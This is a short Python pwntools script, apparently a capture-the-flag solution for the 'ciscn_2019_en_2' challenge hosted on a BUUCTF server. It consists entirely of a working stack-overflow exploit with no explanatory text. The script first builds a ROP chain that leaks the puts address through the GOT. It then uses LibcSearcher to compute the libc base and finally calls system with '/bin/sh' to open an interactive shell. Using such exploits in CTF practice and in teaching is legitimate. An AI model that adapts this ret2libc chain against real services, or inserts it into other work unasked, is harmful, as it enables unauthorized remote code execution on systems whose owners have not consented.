from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 28105)
elf = ELF('./ciscn_2019_en_2')
pop_rdi = 0x400c83 # pop rdi; ret
ret = 0x4006b9 # ret
main_addr = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
io.sendlineafter(b'Input your choice!', b'1')
payload = b'a'*(0x50+0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
io.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)
io.recvuntil(b'Ciphertext\n')
io.recvline()
puts_addr = u64(io.recvline()[:-1].ljust(8, b'\x00'))
log.info('puts_address => 0x%x', puts_addr)
libc = LibcSearcher('puts', puts_addr) # libc6_2.27-3ubuntu1_amd64
libcbase = puts_addr - libc.dump('puts')
log.success('libcbase_address => %s', hex(libcbase))
system_addr = libcbase + libc.dump('system')
log.success('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.dump('str_bin_sh')
log.success('bin_sh_address => %s', hex(bin_sh_addr))
payload = b'a'*(0x50+0x8) + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
io.sendlineafter(b'Input your choice!', b'1')
io.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)
io.interactive()